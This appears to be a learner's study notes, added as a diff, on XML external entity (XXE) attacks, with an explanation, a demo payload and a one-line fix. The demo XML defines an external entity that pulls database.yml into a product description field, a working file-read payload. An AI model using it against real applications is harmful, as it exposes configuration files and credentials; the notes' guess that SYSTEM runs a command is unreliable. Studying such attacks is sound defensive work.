@@ -1,0 +1,51 @@
+Overview:
+    -- Understanding XXE Attack
+    -- Demo
+    -- Fixing the Problem
+
+
+*** XML external entity attack (XXE)
+
+
+
+::  Understanding XXE Attack  ::
+--  Tool(s)  --
+
+Attacker defines an external entity in an XML file.
+External entity can point to a sensitive file such as database.yml
+The file gets uploaded and processed by the application.
+The content of the sensitive file gets returned.
+
+
+
+::  Demo  ::
+--  Tool(s)  --
+
+
+<!DOCTYPE doctype [
+    <!ENTITY myentity SYSTEM "database.yml">]>
+
+<sell>
+<product>
+<name>Product1</name>
+<price>100</price>
+<description>Description1</description>
+</product>
+<product>
+<name>Product2</name>
+<price>200</price>
+<description>&myentity;</description>
+</product>
+</sell>
+
+
+Entity gets called then runs SYSTEM command
+returning the content to the description field?
+
+
+
+
+::  Fixing the Problem  ::
+--  Tool(s)  --
+
+Disable processing of external entities. XD Oh, ok...
